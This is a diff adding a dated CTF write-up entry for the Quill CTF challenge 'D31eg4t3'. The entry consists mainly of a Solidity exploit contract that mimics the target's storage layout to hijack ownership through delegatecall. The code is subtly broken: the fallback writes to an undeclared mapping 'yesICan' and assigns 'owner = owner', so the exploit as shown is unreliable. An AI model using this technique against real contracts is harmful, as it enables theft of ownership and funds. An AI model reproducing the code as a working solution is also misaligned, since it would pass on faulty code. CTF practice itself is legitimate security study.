@@ -880,4 +880,38 @@ contract SafeNFTExploit is IERC721Receiver{
 }
 ```
 
+
+### 2024.09.11
+
+- Quill CTF: D31eg4t3
+
+![image](https://github.com/user-attachments/assets/cfa5ab91-11cf-437b-8f22-731ceb597e43)
+
+```solidity
+contract D31eg4t3Exploit {
+  uint a = 12345;
+  uint8 b = 32;
+  string private d; 
+  uint32 private c; 
+  string private mot; 
+  address public owner;
+  mapping(address => bool) public canYouHackMe; 
+
+  constructor(){
+    owner = msg.sender;
+  }
+
+  function attack(D31eg4t3 delegate) external {
+    (bool success, ) = delegate.hackMe("");
+    require(success, "hack me fail");
+  }
+
+  fallback() external {
+    owner = owner;
+    yesICan[owner] = true;
+  }
+}
+```
+
+
 <!-- Content_END -->
